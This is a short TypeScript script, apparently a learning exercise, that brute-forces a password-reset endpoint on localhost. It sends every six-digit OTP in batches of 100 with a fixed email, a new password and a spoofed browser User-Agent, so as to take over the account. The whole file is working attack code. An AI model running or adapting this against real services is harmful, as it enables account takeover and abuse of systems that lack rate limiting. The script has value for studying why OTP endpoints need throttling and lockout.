import axios from "axios";

async function sendRequest(otp: number) {
  try {
    await axios.post(
      "http://localhost:3000/reset-password",
      {
        email: "garvit@gmail.com",
        otp,
        newPassword: "12345678",
      },
      {
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "Chrome",
        },
      }
    );
    console.log("done for", otp);
  } catch {}
}

/*promise all logic is to batching the request this is used because each nodejs process take some time and we are sending to many request before
they get resolved we send another request so we will run out of memory to prevent this we send request in batches*/
async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j));
    }
    await Promise.all(promises);
  }
}

main();
